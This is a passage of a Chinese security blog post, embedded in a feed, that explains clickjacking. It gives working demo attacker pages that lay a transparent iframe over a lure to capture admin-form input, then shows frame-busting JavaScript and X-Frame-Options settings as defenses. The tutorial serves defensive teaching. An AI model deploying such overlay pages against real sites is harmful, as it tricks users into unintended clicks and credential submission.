class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0.3;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">          &lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">     &lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146911.11.png" alt></p><h3 id="点击劫持实例-防御对比"><a href="#点击劫持实例-防御对比" class="headerlink" title="点击劫持实例+防御对比"></a>点击劫持实例+防御对比</h3><h4 id="情景一：无任何防御"><a href="#情景一：无任何防御" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p>目标页面代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="submit" name="submit" value="提交"&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：模拟的登录界面</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182354.51.png" alt></p><p>构造透明层iframe</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="./</span>admin.html<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>效果：诱导注册<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182435.88.png" alt></p><p>后台处理：实际场景中是模拟登录，此处为了方便，弹框即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'username'</span>]) &amp;&amp; isset($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('接收成功')&lt;/script&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('hacked by demos')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('数据不完整')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>诱导点击效果：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182583.03.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182595.7.png" alt></p><h4 id="情景二：界面使用JavaScript动态防御"><a href="#情景二：界面使用JavaScript动态防御" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)    <span class="comment">//在应用iframe时top指的是顶级的窗口</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>在网站页面开发加上如上代码，可以动态防御iframe嵌入页面，在检测到有iframe嵌入当前页面时，直接跳转到当前页面，从而防御点击劫持。</p><p>本例实现代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="text-align:center;"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="x.php" method="POST"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="username" name="username"&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="submit" name="submit" value="提交"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>iframe嵌入访问的效果如下：当攻击者诱导用户访问恶意界面时，立即跳转到真正的页面，进行防御</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182966.45.png" alt></p><h4 id="情景三：添加X-Frame-Options头"><a href="#情景三：添加X-Frame-Options头" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><blockquote><p> 使用该头后禁止页面被iframe嵌套 ,chrome有点问题，不知道为什么，emmm</p></blockquote><p>修改代码如下</p><p>admin.php:禁止一切源嵌入当前页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"X-FRAME-OPTIONS:DENY"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">  body&#123; background-repeat: no-repeat;background-size: <span class="number">100</span>% <span class="number">100</span>%;background-attachment: fixed;&#125;</span><br><span class="line">  h2&#123; color:blue;text-align: center;&#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h2&gt;管理员添加&lt;/h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>攻击者构造的恶意页面</p><p>jack.html：opacity改为0.3查看是否嵌套成功</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0.3;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="http:/</span><span class="regexp">/192.168.1.102/</span>clickhack/test2_2/admin.php<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：攻击者没有嵌套成功</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183292.84.png" alt></p><p>访问页面抓取数据包查看</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183394.57.png" alt></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><blockquote><p>最简单的方法：查看目标页面是否可以被iframe嵌套，利用pocbox做演示和上面实例做演示</p></blockquote><h4 id="情景一：无任何防御-1"><a href="#情景一：无任何防御-1" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183600.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183636.5.png" alt></p><h4 id="情景二：界面使用JavaScript动态防御-1"><a href="#情景二：界面使用JavaScript动态防御-1" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183712.82.png" alt></p><h4 id="情景三：添加X-Frame-Options头-1"><a href="#情景三：添加X-Frame-Options头-1" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183798.76.png" alt></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>使用JavaScript动态防御</p><p>使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</p><p>DENY：浏览器会拒绝当前页面加载任何frame页面；</p><p>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</p><p>ALLOW-FROM origin：允许frame加载的页面地址；</p><p>PS：浏览器支持情况：IE8+、Opera10+、Safari4+、Chrome4.1.249.1042+、Firefox3.6.9。</p><p>具体的设置方法：</p><p><strong>Apache配置：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header always append X-Frame-Options SAMEORIGIN</span><br></pre></td></tr></table></figure><p><strong>nginx配置：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header X-Frame-Options SAMEORIGIN;</span><br></pre></td></tr></table></figure><p><strong>IIS配置：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.webServer&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;httpProtocol&gt;</span><br><span class="line">        &lt;customHeaders&gt;</span><br><span class="line">            &lt;add name=<span class="string">"X-Frame-Options"</span> value=<span class="string">"SAMEORIGIN"</span> /&gt;</span><br><span class="line">        &lt;<span class="regexp">/customHeaders&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>httpProtocol&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;<span class="regexp">/system.webServer&gt;</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>界面操作劫持漏洞挖掘只需要确认：目标的HTTP响应头是否设置好了X-Frame-Options字段；目标是否又JavaScript的Frame Busting机制；更简单的是用iframe嵌入目标站点试试，如果成功，则证明漏洞存在。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>web前端黑客技术揭秘</p><p><a href="https://www.cnblogs.com/lovesong/p/5248483.html" target="_blank" rel="noopener">https://www.cnblogs.com/lovesong/p/5248483.html</a></p><p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;界面劫持&quot;&gt;&lt;a href=&quot;#界面劫持&quot; class=&quot;headerlink&quot; title=&quot;界面劫持&quot;&gt;&lt;/a&gt;界面劫持&lt;/h3&gt;&lt;p&gt;界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以
      
    
    </summary>
    
      <category term="web前端相关" scheme="https://www.lsowl.top/categories/web%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="界面劫持" scheme="https://www.lsowl.top/tags/%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81/"/>
    
      <category term="web前端" scheme="https://www.lsowl.top/tags/web%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
</feed>
